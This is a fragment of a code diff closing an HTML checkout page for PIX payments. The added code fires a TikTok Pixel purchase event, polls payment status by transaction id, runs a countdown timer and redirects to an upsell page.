+                window.ttq.track('Purchase', {
+                  value: parseFloat(sessionStorage.getItem('sealpay_total') || pixTotal || 0),
+                  currency: 'BRL'
+                });
+                console.log('[TikTok Pixel] Purchase disparado no pix.html.');
+              }
+            } catch (ePix) {
+              console.error('[TikTok Pixel] Erro ao disparar Purchase no pix.html:', ePix);
+            }
+            // Aguarda 1.5s para garantir que o evento foi enviado antes de redirecionar
+            setTimeout(function () {
+              window.location.href = '/up-up-1';
+            }, 1500);
+          }
+        } catch (err) {
+          console.error('[SealPay] Erro no polling:', err);
+        }
+      }, 5000);
+    }
+
+    // ===== Inicializações =====
+    renderPedidoItems();
+    startRegressivo();
+    setDeadlineDate();
+
+    // Inicia polling se tiver txid
+    if (pixTxid) iniciarPolling(pixTxid);
+  </script>
+
+</body>
+
+</html>
